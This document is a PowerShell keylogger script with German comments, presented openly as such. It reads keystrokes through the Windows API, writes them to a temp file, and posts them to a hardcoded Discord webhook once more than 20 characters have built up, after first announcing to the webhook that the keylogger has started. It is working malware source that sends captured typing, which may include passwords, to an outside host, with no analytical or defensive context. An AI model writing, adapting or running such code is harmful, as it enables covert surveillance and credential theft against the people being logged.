$webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"

# 2. START-MELDUNG (Mit Fix für den JSON-Fehler)
$msgBody = @{ content = "✅ Keylogger gestartet und bereit!" } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $msgBody -ContentType "application/json; charset=utf-8"
} catch {
    # Falls es hier schon kracht, stimmt die URL nicht
}

$LogPath = "$env:TEMP\log.txt"
if (Test-Path $LogPath) { Remove-Item $LogPath }

# 3. TASTATUR-FUNKTION
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$lastKeys = @{}

# 4. HAUPT-LOOP
while ($true) {
    Start-Sleep -Milliseconds 10
    
    for ($i = 8; $i -le 190; $i++) {
        $state = [Keylogger]::GetAsyncKeyState($i)
        
        if ($state -and 0x8000) {
            if (-not $lastKeys[$i]) {
                $lastKeys[$i] = $true
                
                # Filter für Buchstaben, Zahlen und Leerzeichen
                if (($i -ge 48 -and $i -le 90) -or ($i -eq 32)) {
                    $key = [char]$i
                    $key | Out-File -FilePath $LogPath -Append -NoNewline
                }
                elseif ($i -eq 13) {
                    " [ENTER] " | Out-File -FilePath $LogPath -Append -NoNewline
                }
            }
        } 
        else {
            $lastKeys[$i] = $false
        }
    }

    # 5. DATEN SENDEN (Wenn 20 Zeichen erreicht sind)
    if (Test-Path $LogPath) {
        if ((Get-Item $LogPath).Length -gt 20) {
            $content = Get-Content $LogPath -Raw
            $payload = @{ content = "⌨️ Getippt: $content" } | ConvertTo-Json -Compress
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json; charset=utf-8"
                Clear-Content $LogPath
            } catch {
                Start-Sleep -Seconds 5
            }
        }
    }
}
}
